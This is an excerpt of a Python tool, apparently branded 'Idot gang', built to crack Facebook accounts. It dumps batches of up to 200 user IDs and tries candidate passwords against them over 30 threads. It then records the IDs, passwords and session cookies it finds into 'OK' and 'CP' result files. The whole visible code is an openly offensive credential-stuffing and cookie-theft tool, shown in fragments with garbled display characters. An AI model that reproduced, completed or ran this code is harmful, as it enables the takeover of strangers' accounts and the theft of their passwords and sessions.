...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t  TOOL OWNER  : [green]Iodt gang(welcome to our tool ) [BLUE] '))
		...
		print(f'  {u}[{h}â€¢{u}]{h} LOGIN DONEðŸ˜.........Press Enter: python Idot.py{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('âž¥âž¥âž£Result OK IdotN ')
	print('âž¥âž¥âž£Result CP Idot ')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('âž¥âž¥âž£ENTER LIMIT ID?(MAX-200-ID): '))
	except ValueError:
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,mbasic,idf,pwv)
	print('')
	cetak(nel('\t[purple]âž¥âž¥âž£[green] Crack Done/n THANKS TO Idot gang [purple] <<[green] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}Idot-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]      ðŸŽ€ðŸ˜˜ðŸ˜HELLO THIS Idot gangðŸ˜ðŸ˜˜ðŸŽ€[green]')) 
				print(f'\r{H} âž¥âž¥âž£Idot\n âž¥âž¥âž£Status :ACTIVE\n âž¥âž¥âž£UID :{idf}\n âž¥âž¥âž£PASSWORD:{pw}\n âž¥âž¥âž£COOKIES :{kuki}\n{ua}{N}')
				open('OK Idot/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      ðŸŽ€ðŸ˜˜ðŸ˜HELLO THIS Idot gangðŸ˜ðŸ˜˜ðŸŽ€[purple]')) 
				print(f'\r{H} âž¥âž¥âž£Idot\n âž¥âž¥âž£Status :ACTIVE\n âž¥âž¥âž£UID :{idf}\n âž¥âž¥âž£PASSWORD:{pw}\n âž¥âž¥âž£COOKIES :{kuki}\n{ua}{N}')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/Idot/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='Idot OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/Idot/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[â€¢] ID       : {idf} [â€¢] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='Idot  CP'))
					open('/sdcard/Idot' ,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/Idot' ,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[â€¢] ID       : {idf}\n[â€¢] PASSWORD : {pw}\n[â€¢] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK Idot'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
...
def ceker(idf,pw):
	...
	try:
		...
		open('CP Idot/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
...
if __name__=='__main__':
	...
	try:os.mkdir('OK Idot')
	except:pass
	try:os.mkdir('CP Idot')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
